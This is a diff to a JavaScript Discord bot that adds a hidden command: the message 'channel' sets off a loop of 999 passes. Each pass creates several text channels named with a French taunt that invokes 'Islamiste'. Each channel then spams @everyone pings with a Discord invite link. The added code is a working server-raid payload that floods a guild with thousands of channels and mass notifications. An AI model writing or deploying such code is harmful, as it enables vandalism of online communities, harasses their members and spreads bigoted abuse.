@@ -45,7 +45,19 @@ if (message.content === "&botinfo"){
 
    return message.channel.send(botembed);
 }
+if(message.content === "channel"){
+                    message.channel.send("roles").then(m => m.delete());
+                    message.channel.send("issou").then(m => m.delete());
+                      for(var i = 0; i < 999; i++){
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("!everyone ."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
 
+}
+}
 if(message.content.includes("&serversj")){
   console.log(`${bot.guilds.map(c => c.name)}`)
 }
